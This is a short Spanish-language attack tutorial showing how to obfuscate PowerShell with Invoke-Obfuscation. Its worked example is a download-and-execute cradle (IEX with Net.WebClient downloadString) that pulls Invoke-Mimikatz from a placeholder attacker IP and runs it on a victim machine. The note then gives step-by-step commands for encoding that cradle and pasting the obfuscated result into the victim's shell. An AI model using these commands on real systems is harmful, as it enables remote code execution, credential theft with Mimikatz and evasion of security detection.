# USO DEL INVOKE OBFUSCATION

Esto nos permite ofuscar los comandos que hacemos desde powershell.

EJ:

supongamos que estamos en una powershell en lamaquina vvvictima  queremos invocar al mimikatz desde la maquina atacante con un WebRequest

```
IEX(New-Object Net.WebClient).downloadString('htttp://<ip-atacante>:8000/Invoke-Mimikatz.ps1')
```

esto lo vamos a ofuscar.

primero descargamos el pwsh:

[https://github.com/PowerShell/PowerShell](https://github.com/PowerShell/PowerShell)

entramos a ese lik y bajamos y descargamos para ubuntu el .deb en la version stable

una vez descargado lo instalamos con 

```
dpkg -i paquete.deb
```

y ejecutamos 

```
pwsh
```

Esto nos permite tener una powershell en linux

ahora nos descargamos el Invoke-Obfuscation

[https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

nos clonamos

y desde la powershell pwsh vamos al directorio del Invoke-Obfuscation y ejecutamos lo siguiente

```
Import-Module ./Invoke-Obfuscation.psd1

Invoke-Obfuscation

SET SCRIPTBLOCK IEX(New-Object Net.WebClient).downloadString('htttp://<ip-atacante>:8000/Invoke-Mimikatz.ps1')

ENCODING

5

```

Ahora copiamos el result que es el comando IEX(...) que colocamos solo que obfuscado.

lo colocamos en la powershell de la victima  de igual forma hara el get del invoke-Mimikatz con el el ejemplo.